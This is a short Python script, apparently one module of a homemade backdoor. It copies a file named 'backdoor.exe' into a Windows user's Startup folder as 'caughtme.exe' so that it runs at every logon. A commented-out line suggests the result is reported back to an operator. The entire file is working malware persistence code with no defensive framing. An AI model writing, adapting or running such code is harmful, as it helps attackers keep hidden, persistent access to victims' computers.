import os
import shutil

def persistent():
    try:
        filepath = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
        actual_filepath = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', 'caughtme.pyw')
        if os.path.exists(actual_filepath):
            return
        else: 
            source_file = open('backdoor.exe', 'rb')
            os.chdir(filepath)
            destination_file = open('caughtme.exe', 'wb')
            shutil.copyfileobj(source_file, destination_file)
    except Exception as err:
        # return bytes("Couldn't upload to start up file", 'utf-8')
        return print(err)
    
persistent()